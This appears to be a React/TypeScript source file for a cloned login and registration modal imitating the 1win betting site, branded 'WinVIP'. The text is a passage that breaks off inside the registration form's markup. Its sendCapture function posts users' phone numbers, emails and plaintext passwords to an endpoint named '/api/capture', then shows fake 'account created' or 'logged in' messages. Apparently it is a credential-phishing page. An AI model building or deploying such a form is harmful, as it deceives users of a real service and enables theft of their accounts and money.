'use client';

import React, { useState, useEffect, useMemo } from 'react';

export interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: 'login' | 'register';
}

// --------------------------------------------------------------------------
// Currencies matching Image 2
// --------------------------------------------------------------------------
export interface CurrencyItem {
  code: string;
  name: string;
  symbol: string;
  badgeBg: string;
  badgeColor?: string;
  badgeType: 'crypto' | 'fiat';
}

export const CURRENCIES: CurrencyItem[] = [
  { code: 'INR', name: 'Indian rupee', symbol: '₹', badgeBg: '#00a859', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: '1WIN', name: '1win Token', symbol: '1WIN', badgeBg: '#d7a13d', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BCH', name: 'Bitcoin Cash', symbol: 'BCH', badgeBg: '#0ac18e', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BNB', name: 'Binance coin', symbol: 'BNB', badgeBg: '#f3ba2f', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BTC', name: 'Bitcoin', symbol: 'BTC', badgeBg: '#f7931a', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DASH', name: 'Dash', symbol: 'DASH', badgeBg: '#008de4', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DOGE', name: 'Dogecoin', symbol: 'DOGE', badgeBg: '#c2a633', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'ETC', name: 'Ethereum Classic', symbol: 'ETC', badgeBg: '#1f1f1f', badgeColor: '#10b981', badgeType: 'crypto' },
  { code: 'ETH', name: 'Ethereum', symbol: 'ETH', badgeBg: '#627eea', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'HYPE', name: 'Hype', symbol: 'HYPE', badgeBg: '#0b3c37', badgeColor: '#00e5a3', badgeType: 'crypto' },
  { code: 'LINK', name: 'Chainlink', symbol: 'LINK', badgeBg: '#375bd2', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'LTC', name: 'Litecoin', symbol: 'LTC', badgeBg: '#bebebe', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'USD', name: 'US Dollar', symbol: '$', badgeBg: '#10b981', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'EUR', name: 'Euro', symbol: '€', badgeBg: '#2563eb', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'USDT', name: 'Tether (USDT)', symbol: '₮', badgeBg: '#26a17b', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'TRX', name: 'TRON', symbol: 'TRX', badgeBg: '#ef4444', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BDT', name: 'Bangladeshi Taka', symbol: '৳', badgeBg: '#059669', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'PKR', name: 'Pakistani Rupee', symbol: '₨', badgeBg: '#15803d', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'AED', name: 'UAE Dirham', symbol: 'د.إ', badgeBg: '#0d9488', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'RUB', name: 'Russian Ruble', symbol: '₽', badgeBg: '#3b82f6', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'BRL', name: 'Brazilian Real', symbol: 'R$', badgeBg: '#16a34a', badgeColor: '#ffffff', badgeType: 'fiat' },
];

// --------------------------------------------------------------------------
// Countries matching Image 3
// --------------------------------------------------------------------------
export interface CountryItem {
  code: string;
  name: string;
  flag: string;
  searchStr: string;
}

export const COUNTRIES: CountryItem[] = [
  { code: '+91', name: 'India', flag: '🇮🇳', searchStr: 'india +91' },
  { code: '+7', name: 'Russia (Россия)', flag: '🇷🇺', searchStr: 'russia россия +7' },
  { code: '+380', name: 'Ukraine (Україна)', flag: '🇺🇦', searchStr: 'ukraine україна +380' },
  { code: '+355', name: 'Albania', flag: '🇦🇱', searchStr: 'albania +355' },
  { code: '+213', name: 'Algeria', flag: '🇩🇿', searchStr: 'algeria +213' },
  { code: '+1', name: 'American Samoa', flag: '🇦🇸', searchStr: 'american samoa +1' },
  { code: '+376', name: 'Andorra', flag: '🇦🇩', searchStr: 'andorra +376' },
  { code: '+244', name: 'Angola', flag: '🇦🇴', searchStr: 'angola +244' },
  { code: '+1264', name: 'Anguilla', flag: '🇦🇮', searchStr: 'anguilla +1264' },
  { code: '+1268', name: 'Antigua and Barbuda', flag: '🇦🇬', searchStr: 'antigua and barbuda +1268' },
  { code: '+54', name: 'Argentina', flag: '🇦🇷', searchStr: 'argentina +54' },
  { code: '+374', name: 'Armenia (Հայաստան)', flag: '🇦🇲', searchStr: 'armenia հայաստան +374' },
  { code: '+297', name: 'Aruba', flag: '🇦🇼', searchStr: 'aruba +297' },
  { code: '+61', name: 'Australia', flag: '🇦🇺', searchStr: 'australia +61' },
  { code: '+43', name: 'Austria', flag: '🇦🇹', searchStr: 'austria +43' },
  { code: '+994', name: 'Azerbaijan', flag: '🇦🇿', searchStr: 'azerbaijan +994' },
  { code: '+1242', name: 'Bahamas', flag: '🇧🇸', searchStr: 'bahamas +1242' },
  { code: '+973', name: 'Bahrain', flag: '🇧🇭', searchStr: 'bahrain +973' },
  { code: '+880', name: 'Bangladesh', flag: '🇧🇩', searchStr: 'bangladesh +880' },
  { code: '+375', name: 'Belarus', flag: '🇧🇾', searchStr: 'belarus +375' },
  { code: '+32', name: 'Belgium', flag: '🇧🇪', searchStr: 'belgium +32' },
  { code: '+55', name: 'Brazil', flag: '🇧🇷', searchStr: 'brazil +55' },
  { code: '+1', name: 'Canada', flag: '🇨🇦', searchStr: 'canada +1' },
  { code: '+86', name: 'China', flag: '🇨🇳', searchStr: 'china +86' },
  { code: '+20', name: 'Egypt', flag: '🇪🇬', searchStr: 'egypt +20' },
  { code: '+33', name: 'France', flag: '🇫🇷', searchStr: 'france +33' },
  { code: '+49', name: 'Germany', flag: '🇩🇪', searchStr: 'germany +49' },
  { code: '+62', name: 'Indonesia', flag: '🇮🇩', searchStr: 'indonesia +62' },
  { code: '+98', name: 'Iran', flag: '🇮🇷', searchStr: 'iran +98' },
  { code: '+964', name: 'Iraq', flag: '🇮🇶', searchStr: 'iraq +964' },
  { code: '+39', name: 'Italy', flag: '🇮🇹', searchStr: 'italy +39' },
  { code: '+81', name: 'Japan', flag: '🇯🇵', searchStr: 'japan +81' },
  { code: '+7', name: 'Kazakhstan', flag: '🇰🇿', searchStr: 'kazakhstan +7' },
  { code: '+254', name: 'Kenya', flag: '🇰🇪', searchStr: 'kenya +254' },
  { code: '+965', name: 'Kuwait', flag: '🇰🇼', searchStr: 'kuwait +965' },
  { code: '+60', name: 'Malaysia', flag: '🇲🇾', searchStr: 'malaysia +60' },
  { code: '+52', name: 'Mexico', flag: '🇲🇽', searchStr: 'mexico +52' },
  { code: '+977', name: 'Nepal', flag: '🇳🇵', searchStr: 'nepal +977' },
  { code: '+31', name: 'Netherlands', flag: '🇳🇱', searchStr: 'netherlands +31' },
  { code: '+234', name: 'Nigeria', flag: '🇳🇬', searchStr: 'nigeria +234' },
  { code: '+92', name: 'Pakistan', flag: '🇵🇰', searchStr: 'pakistan +92' },
  { code: '+63', name: 'Philippines', flag: '🇵🇭', searchStr: 'philippines +63' },
  { code: '+48', name: 'Poland', flag: '🇵🇱', searchStr: 'poland +48' },
  { code: '+974', name: 'Qatar', flag: '🇶🇦', searchStr: 'qatar +974' },
  { code: '+966', name: 'Saudi Arabia', flag: '🇸🇦', searchStr: 'saudi arabia +966' },
  { code: '+65', name: 'Singapore', flag: '🇸🇬', searchStr: 'singapore +65' },
  { code: '+27', name: 'South Africa', flag: '🇿🇦', searchStr: 'south africa +27' },
  { code: '+82', name: 'South Korea', flag: '🇰🇷', searchStr: 'south korea +82' },
  { code: '+34', name: 'Spain', flag: '🇪🇸', searchStr: 'spain +34' },
  { code: '+94', name: 'Sri Lanka', flag: '🇱🇰', searchStr: 'sri lanka +94' },
  { code: '+66', name: 'Thailand', flag: '🇹🇭', searchStr: 'thailand +66' },
  { code: '+90', name: 'Turkey', flag: '🇹🇷', searchStr: 'turkey +90' },
  { code: '+971', name: 'United Arab Emirates', flag: '🇦🇪', searchStr: 'united arab emirates uae +971' },
  { code: '+44', name: 'United Kingdom', flag: '🇬🇧', searchStr: 'united kingdom uk +44' },
  { code: '+1', name: 'United States', flag: '🇺🇸', searchStr: 'united states usa +1' },
  { code: '+998', name: 'Uzbekistan', flag: '🇺🇿', searchStr: 'uzbekistan +998' },
  { code: '+84', name: 'Vietnam', flag: '🇻🇳', searchStr: 'vietnam +84' },
];

// --------------------------------------------------------------------------
// Icons
// --------------------------------------------------------------------------
function CloseIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
      <line x1="18" y1="6" x2="6" y2="18" />
      <line x1="6" y1="6" x2="18" y2="18" />
    </svg>
  );
}

function ChevronDownIcon({ className = '' }: { className?: string }) {
  return (
    <svg className={className} width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="6 9 12 15 18 9" />
    </svg>
  );
}

function SearchIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="11" cy="11" r="8" />
      <line x1="21" y1="21" x2="16.65" y2="16.65" />
    </svg>
  );
}

function EnvelopeIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
    </svg>
  );
}

function EyeIcon({ show }: { show: boolean }) {
  if (show) {
    return (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
        <circle cx="12" cy="12" r="3" />
      </svg>
    );
  }
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  );
}

// --------------------------------------------------------------------------
// Currency Badge Renderer
// --------------------------------------------------------------------------
function CurrencyBadge({ currency, size = 32 }: { currency: CurrencyItem; size?: number }) {
  const iconSize = size;
  const is1win = currency.code === '1WIN';
  const isEth = currency.code === 'ETH' || currency.code === 'ETC';
  const isBtc = currency.code === 'BTC';
  const isBch = currency.code === 'BCH';
  const isBnb = currency.code === 'BNB';
  const isDoge = currency.code === 'DOGE';
  const isDash = currency.code === 'DASH';
  const isLink = currency.code === 'LINK';
  const isHype = currency.code === 'HYPE';

  return (
    <div
      style={{
        width: `${iconSize}px`,
        height: `${iconSize}px`,
        borderRadius: isLink ? '8px' : '50%',
        backgroundColor: currency.badgeBg,
        color: currency.badgeColor || '#ffffff',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        flexShrink: 0,
        fontWeight: 'bold',
        fontSize: `${Math.round(iconSize * 0.44)}px`,
        boxShadow: '0 1px 3px rgba(0,0,0,0.1)',
      }}
    >
      {is1win ? (
        <span style={{ fontSize: '11px', fontWeight: 800, letterSpacing: '-0.5px' }}>1w</span>
      ) : isEth ? (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 1.5l-6.5 10.75 6.5 3.75 6.5-3.75L12 1.5zM5.5 13.5L12 22.5l6.5-9L12 16.5l-6.5-3z" />
        </svg>
      ) : isBtc ? (
        <span>₿</span>
      ) : isBch ? (
        <span style={{ transform: 'rotate(-12deg)' }}>₿</span>
      ) : isBnb ? (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2l3 3-5 5-3-3 5-5zm5 5l3 3-3 3-3-3 3-3zM7 7l3 3-3 3-3-3 3-3zm5 5l3 3-3 3-3-3 3-3zm0 7l3 3-5 5-3-3 5-5z" />
        </svg>
      ) : isDoge ? (
        <span>Ð</span>
      ) : isDash ? (
        <span style={{ fontStyle: 'italic', fontWeight: 900 }}>D</span>
      ) : isLink ? (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2L4 6.5v11L12 22l8-4.5v-11L12 2zm0 3.4l5 2.8v5.6l-5 2.8-5-2.8V8.2l5-2.8z" />
        </svg>
      ) : isHype ? (
        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
          <circle cx="8" cy="12" r="3" />
          <circle cx="16" cy="12" r="3" />
        </svg>
      ) : (
        <span>{currency.symbol}</span>
      )}
    </div>
  );
}

// --------------------------------------------------------------------------
// Social Logos matching Image 1
// --------------------------------------------------------------------------
function GoogleIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24">
      <path
        fill="#111827"
        d="M21.35 11.1H12v2.96h5.36c-.5 2.37-2.52 3.94-5.36 3.94-3.31 0-6-2.69-6-6s2.69-6 6-6c1.47 0 2.81.54 3.85 1.43l2.22-2.22C16.63 3.86 14.47 3 12 3 7.03 3 3 7.03 3 12s4.03 9 9 9c5.2 0 8.64-3.66 8.64-8.8 0-.67-.06-1.32-.29-2.1z"
      />
    </svg>
  );
}

function TelegramIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.19c-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.38-.27-2.06-.49-.83-.27-1.49-.42-1.43-.88.03-.24.37-.49 1.02-.74l7.9-3.41z" />
    </svg>
  );
}

function WebMoneyIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#111827" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M4 10l4 5 4-5 4 5 4-5" />
    </svg>
  );
}

function MetaMaskFoxIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M21.5 5.5l-3 4-2.5-3-4 1.5-4-1.5-2.5 3-3-4L6 4l6 2 6-2 3.5 1.5zM2.5 13l3.5 5.5 3-2-2-4.5-4.5 1zm19 0l-4.5-1-2 4.5 3 2 3.5-5.5zm-14.5 2l5 4 5-4-1-3h-8l-1 3z" />
    </svg>
  );
}

function ShieldIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm0 2.18V19.9C8.36 18.81 5.8 14.86 5.8 11.09V6.36L12 4.18z" />
    </svg>
  );
}

// --------------------------------------------------------------------------
// Main Modal Component
// --------------------------------------------------------------------------
export default function AuthModal({ isOpen, onClose, initialMode = 'register' }: AuthModalProps) {
  const [authMode, setAuthMode] = useState<'login' | 'register'>(initialMode);
  const [subView, setSubView] = useState<'form' | 'currency' | 'country'>('form');

  // Login state
  const [loginSubTab, setLoginSubTab] = useState<'phone' | 'email'>('phone');
  const [loginPhone, setLoginPhone] = useState('');
  const [loginPhoneCountry, setLoginPhoneCountry] = useState<CountryItem>(COUNTRIES[0]);
  const [loginPhoneErr, setLoginPhoneErr] = useState('');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginEmailErr, setLoginEmailErr] = useState('');
  const [loginPwd, setLoginPwd] = useState('');
  const [loginPwdErr, setLoginPwdErr] = useState('');
  const [showLoginPwd, setShowLoginPwd] = useState(false);

  // Registration state
  const [regCurrency, setRegCurrency] = useState<CurrencyItem>(CURRENCIES[0]); // Default INR
  const [regCountry, setRegCountry] = useState<CountryItem>(COUNTRIES[0]); // Default India +91
  const [regPhone, setRegPhone] = useState('');
  const [regPhoneErr, setRegPhoneErr] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regEmailErr, setRegEmailErr] = useState('');
  const [regPwd, setRegPwd] = useState('');
  const [regPwdErr, setRegPwdErr] = useState('');
  const [showRegPwd, setShowRegPwd] = useState(false);
  const [showPromo, setShowPromo] = useState(false);
  const [regPromo, setRegPromo] = useState('');
  const [regAgreed, setRegAgreed] = useState(true);
  const [regAgreedErr, setRegAgreedErr] = useState('');

  // Search states for pickers
  const [currencySearch, setCurrencySearch] = useState('');
  const [countrySearch, setCountrySearch] = useState('');

  // Submission / feedback state
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');

  // Sync initial mode
  useEffect(() => {
    setAuthMode(initialMode);
    setSubView('form');
  }, [initialMode, isOpen]);

  // Lock body scroll when open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [isOpen]);

  const clearAllErrors = () => {
    setLoginPhoneErr('');
    setLoginEmailErr('');
    setLoginPwdErr('');
    setRegPhoneErr('');
    setRegEmailErr('');
    setRegPwdErr('');
    setRegAgreedErr('');
    setStatusMessage('');
  };

  const handleClose = React.useCallback(() => {
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
    setIsSubmitting(false);
    setSubView('form');
    onClose();
  }, [onClose]);

  // Close on Escape key
  useEffect(() => {
    const handleKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        if (subView !== 'form') {
          setSubView('form');
        } else {
          handleClose();
        }
      }
    };
    document.addEventListener('keydown', handleKey);
    return () => document.removeEventListener('keydown', handleKey);
  }, [handleClose, subView]);

  // Filtered Currencies
  const filteredCurrencies = useMemo(() => {
    if (!currencySearch.trim()) return CURRENCIES;
    const q = currencySearch.toLowerCase().trim();
    return CURRENCIES.filter(
      (c) => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.symbol.toLowerCase().includes(q)
    );
  }, [currencySearch]);

  // Filtered Countries
  const filteredCountries = useMemo(() => {
    if (!countrySearch.trim()) return COUNTRIES;
    const q = countrySearch.toLowerCase().trim();
    return COUNTRIES.filter(
      (c) => c.searchStr.includes(q) || c.name.toLowerCase().includes(q) || c.code.includes(q)
    );
  }, [countrySearch]);

  // Phone sanitization
  const handlePhoneChange = (val: string, setter: (v: string) => void) => {
    const clean = val.replace(/[^\d\s]/g, '');
    setter(clean);
  };

  // Submit capture helper
  const sendCapture = async (data: Record<string, unknown>) => {
    setIsSubmitting(true);
    setShowSuccess(false);
    setShowError(false);

    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
      setIsSubmitting(false);
      if (res.ok) {
        setShowSuccess(true);
        setStatusMessage(
          data.type === 'Registration'
            ? 'Account created successfully! Welcome to WinVIP.'
            : 'Logged in successfully.'
        );
      } else {
        setShowError(true);
      }
    } catch {
      setIsSubmitting(false);
      setShowError(true);
    }
  };

  // Handle Registration Submit
  const handleRegisterSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    const digits = regPhone.replace(/\D/g, '');
    if (!regPhone.trim()) {
      setRegPhoneErr('Please enter your phone number');
      valid = false;
    } else if (digits.length < 8) {
      setRegPhoneErr('Please enter a valid phone number');
      valid = false;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!regEmail.trim()) {
      setRegEmailErr('Please enter your email address');
      valid = false;
    } else if (!emailRegex.test(regEmail.trim())) {
      setRegEmailErr('Please enter a valid email address');
      valid = false;
    }

    if (!regPwd.trim()) {
      setRegPwdErr('Please enter a password');
      valid = false;
    } else if (regPwd.trim().length < 8) {
      setRegPwdErr('Password must be at least 8 characters');
      valid = false;
    }

    if (!regAgreed) {
      setRegAgreedErr('You must accept the User Agreement');
      valid = false;
    }

    if (!valid) return;

    await sendCapture({
      type: 'Registration',
      currency: regCurrency.code,
      currencyName: regCurrency.name,
      phone: `${regCountry.code} ${regPhone}`,
      email: regEmail,
      password: regPwd,
      promoCode: regPromo || undefined,
      agreedTerms: regAgreed,
    });
  };

  // Handle Login Submit
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    if (loginSubTab === 'phone') {
      const digits = loginPhone.replace(/\D/g, '');
      if (!loginPhone.trim()) {
        setLoginPhoneErr('Please enter your phone number');
        valid = false;
      } else if (digits.length < 8) {
        setLoginPhoneErr('Please enter a valid phone number');
        valid = false;
      }
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!loginEmail.trim()) {
        setLoginEmailErr('Please enter your email address');
        valid = false;
      } else if (!emailRegex.test(loginEmail.trim())) {
        setLoginEmailErr('Please enter a valid email address');
        valid = false;
      }
    }

    if (!loginPwd.trim()) {
      setLoginPwdErr('Please enter your password');
      valid = false;
    } else if (loginPwd.trim().length < 6) {
      setLoginPwdErr('Password must be at least 6 characters');
      valid = false;
    }

    if (!valid) return;

    await sendCapture({
      type: 'Login',
      method: loginSubTab,
      identifier: loginSubTab === 'phone' ? `${loginPhoneCountry.code} ${loginPhone}` : loginEmail,
      password: loginPwd,
    });
  };

  if (!isOpen) return null;

  return (
    <div
      className="win-auth-overlay"
      onClick={(e) => {
        if (e.target === e.currentTarget) handleClose();
      }}
    >
      <div className="win-auth-sheet" role="dialog" aria-modal="true">
        {/* ===================================================================
            SUCCESS / ERROR OVERLAY
            =================================================================== */}
        {showSuccess ? (
          <div className="win-auth-card-body win-feedback-container">
            <div className="win-feedback-card win-feedback-success">
              <div className="win-feedback-icon">✓</div>
              <h3 className="win-feedback-title">{authMode === 'register' ? 'Account Created' : 'Welcome Back'}</h3>
              <p className="win-feedback-message">{statusMessage}</p>
              <button type="button" className="win-btn-submit" onClick={handleClose}>
                Continue
              </button>
            </div>
          </div>
        ) : showError ? (
          <div className="win-auth-card-body win-feedback-container">
            <div className="win-feedback-card win-feedback-error">
              <div className="win-feedback-icon win-feedback-icon-err">!</div>
              <h3 className="win-feedback-title" style={{ color: '#ef4444' }}>Network Error</h3>
              <p className="win-feedback-message">Unable to connect to server. Please try again.</p>
              <button type="button" className="win-btn-submit" onClick={() => setShowError(false)}>
                Try Again
              </button>
            </div>
          </div>
        ) : subView === 'currency' ? (
          /* ===================================================================
              VIEW: CHOOSE CURRENCY (Image 2)
              =================================================================== */
          <div className="win-subview-container">
            <div className="win-auth-header">
              <h2 className="win-auth-title">Choose currency</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Back to registration"
                onClick={() => setSubView('form')}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="win-search-box">
              <span className="win-search-icon">
                <SearchIcon />
              </span>
              <input
                type="text"
                className="win-search-input"
                placeholder="Search"
                value={currencySearch}
                onChange={(e) => setCurrencySearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="win-picker-list">
              {filteredCurrencies.map((c) => {
                const isSelected = regCurrency.code === c.code;
                return (
                  <button
                    key={c.code}
                    type="button"
                    className={`win-currency-item${isSelected ? ' win-picker-item--active' : ''}`}
                    onClick={() => {
                      setRegCurrency(c);
                      setSubView('form');
                    }}
                  >
                    <CurrencyBadge currency={c} size={36} />
                    <div className="win-currency-info">
                      <span className="win-currency-name">{c.name}</span>
                      <span className="win-currency-code">{c.code}</span>
                    </div>
                  </button>
                );
              })}
              {filteredCurrencies.length === 0 && (
                <div className="win-picker-empty">No currencies found</div>
              )}
            </div>
          </div>
        ) : subView === 'country' ? (
          /* ===================================================================
              VIEW: CHOOSE COUNTRY (Image 3)
              =================================================================== */
          <div className="win-subview-container">
            <div className="win-auth-header">
              <h2 className="win-auth-title">Choose country</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Back to registration"
                onClick={() => setSubView('form')}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="win-search-box">
              <span className="win-search-icon">
                <SearchIcon />
              </span>
              <input
                type="text"
                className="win-search-input"
                placeholder="Search"
                value={countrySearch}
                onChange={(e) => setCountrySearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="win-picker-list">
              {filteredCountries.map((country, idx) => {
                const isSelected =
                  authMode === 'register'
                    ? regCountry.code === country.code && regCountry.name === country.name
                    : loginPhoneCountry.code === country.code && loginPhoneCountry.name === country.name;
                return (
                  <button
                    key={`${country.code}-${idx}`}
                    type="button"
                    className={`win-country-item${isSelected ? ' win-picker-item--active' : ''}`}
                    onClick={() => {
                      if (authMode === 'register') {
                        setRegCountry(country);
                      } else {
                        setLoginPhoneCountry(country);
                      }
                      setSubView('form');
                    }}
                  >
                    <span className="win-country-flag">{country.flag}</span>
                    <span className="win-country-dialcode">{country.code}</span>
                    <span className="win-country-name">{country.name}</span>
                  </button>
                );
              })}
              {filteredCountries.length === 0 && (
                <div className="win-picker-empty">No countries found</div>
              )}
            </div>
          </div>
        ) : authMode === 'register' ? (
          /* ===================================================================
              VIEW: REGISTRATION FORM (Image 1)
              =================================================================== */
          <div className="win-auth-card-body">
            {/* Header: Title + Close Button */}
            <div className="win-auth-header">
              <h2 className="win-auth-title">Registration</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Close registration"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <form noValidate onSubmit={handleRegisterSubmit} className="win-form">
              {/* Field 1: Currency Selector Button */}
              <div className="win-field-group">
                <button
                  type="button"
                  className="win-field-pill win-currency-selector-pill"
                  onClick={() => {
                    setCurrencySearch('');
                    setSubView('currency');
                  }}
                  aria-label="Choose currency"
                >
                  <div className="win-field-left">
                    <CurrencyBadge currency={regCurrency} size={28} />
                    <span className="win-currency-selected-name">{regCurrency.name}</span>
                  </div>
                  <ChevronDownIcon className="win-field-chevron" />
                </button>
              </div>

              {/* Field 2: Phone Input with Flag & Dial Code */}
              <div className="win-field-group">
                <div className={`win-field-pill${regPhoneErr ? ' win-field-pill--error' : ''}`}>
                  <button
                    type="button"
                    className="win-country-prefix-btn"
                    onClick={() => {
                      setCountrySearch('');
                      setSubView('country');
                    }}
                    aria-label="Select country code"
                  >
                    <span className="win-country-prefix-flag">{regCountry.flag}</span>
                    <ChevronDownIcon className="win-prefix-chevron" />
                  </button>
                  <div className="win-field-vdivider" />
                  <span className="win-dialcode-badge">{regCountry.code}</span>
                  <input
                    type="tel"
                    className="win-field-input"
                    placeholder="00000 00000"
                    autoComplete="tel"
                    value={regPhone}
                    onChange={(e) => handlePhoneChange(e.target.value, setRegPhone)}
                    onFocus={() => setRegPhoneErr('')}
                  />
                </div>
                {regPhoneErr && <span className="win-field-error-text">{regPhoneErr}</span>}
              </div>

              {/* Field 3: Email Input */}
              <div className="win-field-group">
                <div className={`win-field-pill${regEmailErr ? ' win-field-pill--error' : ''}`}>
                  <span className="win-field-icon">
                    <EnvelopeIcon />
                  </span>
                  <div className="win-field-vdivider" />
                  <input
                    type="email"
                    className="win-field-input"
                    placeholder="Email"
                    autoComplete="email"
                    value={regEmail}
                    onChange={(e) => setRegEmail(e.target.value)}
                    onFocus={() => setRegEmailErr('')}
                  />
                </div>
                {regEmailErr && <span className="win-field-error-text">{regEmailErr}</span>}
              </div>

              {/* Field 4: Password Input */}
              <div className="win-field-group">
                <div className={`win-field-pill${regPwdErr ? ' win-field-pill--error' : ''}`}>
                  <span className="win-field-icon">
                    <LockIcon />
                  </span>
                  <div className="win-field-vdivider" />
                  <input
                    type={showRegPwd ? 'text' : 'password'}
                    className="win-field-input"
                    placeholder="Password"
                    autoComplete="new-password"
                    value={regPwd}
                    onChange={(e) => setRegPwd(e.target.value)}
                    onFocus={() => setRegPwdErr('')}
                  />
                  <button
                    type="button"
                    className="win-field-pwd-toggle"
                    aria-label="Toggle password visibility"
                    onClick={() => setShowRegPwd(!showRegPwd)}
                  >
                    <EyeIcon show={showRegPwd} />
                  </button>
                </div>
                <div className="win-field-helper-text">At least 8 characters</div>
                {regPwdErr && <span className="win-field-error-text">{regPwdErr}</span>}
              </div>

              {/* Promo Code Link & Expanded Input */}
              <div className="win-promo-section">
                <button
                  type="button"
                  className="win-promo-link-btn"
                  onClick={() => setShowPromo(!showPromo)}
                >
                  {showPromo ? '− Hide promo code' : 'Add promo code'}
                </button>
                {showPromo && (
                  <div className="win-promo-input-wrap">
                    <input
                      type="text"
